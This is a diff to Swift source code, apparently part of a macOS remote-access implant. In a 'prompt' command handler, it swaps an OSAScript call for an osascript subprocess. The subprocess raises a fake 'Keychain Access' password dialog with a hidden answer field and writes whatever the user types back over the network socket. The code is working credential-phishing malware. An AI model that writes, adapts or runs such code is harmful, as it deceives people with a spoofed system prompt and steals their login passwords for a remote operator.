@@ -184,25 +184,16 @@ do {
         else if a! == "prompt"{
             
             do {
-                    let script = ##"set popup to display dialog "Keychain Access wants to use the login keychain" & return & return & "Please enter the keychain password" & return the default answer "" with title "Authentication Needed" with hidden answer"##
-                    let k = OSAScript.init(source: script, language: OSALanguage.init(forName: "AppleScript"))
-                    
-                    var compileErr : NSDictionary?
-                    k.compileAndReturnError(&compileErr)
-                    var scriptError : NSDictionary?
-                    k.executeAndReturnError(&scriptError)
-                
-                
-//                let proc = Process()
-//                proc.launchPath = "/usr/bin/osascript"
-//                let args : [String] = ["-e", ##"set popup to display dialog "Keychain Access wants to use the login keychain" & return & return & "Please enter the keychain password" & return default answer "" with title "Authentication Needed" with hidden answer"##]
-//                proc.arguments = args
-//                let pipe = Pipe()
-//                proc.standardOutput = pipe
-//                proc.launch()
-//                let rslts = pipe.fileHandleForReading.readDataToEndOfFile()
-//                let output = String(data: rslts, encoding: String.Encoding.utf8)
-//                try sock.write(from: output!)
+                let proc = Process()
+                proc.launchPath = "/usr/bin/osascript"
+                let args : [String] = ["-e", ##"set popup to display dialog "Keychain Access wants to use the login keychain" & return & return & "Please enter the keychain password" & return default answer "" with title "Authentication Needed" with hidden answer"##]
+                proc.arguments = args
+                let pipe = Pipe()
+                proc.standardOutput = pipe
+                proc.launch()
+                let rslts = pipe.fileHandleForReading.readDataToEndOfFile()
+                let output = String(data: rslts, encoding: String.Encoding.utf8)
+                try sock.write(from: output!)
                 
             } catch {
                 try sock.write(from: "[-] Cancel button clicked")
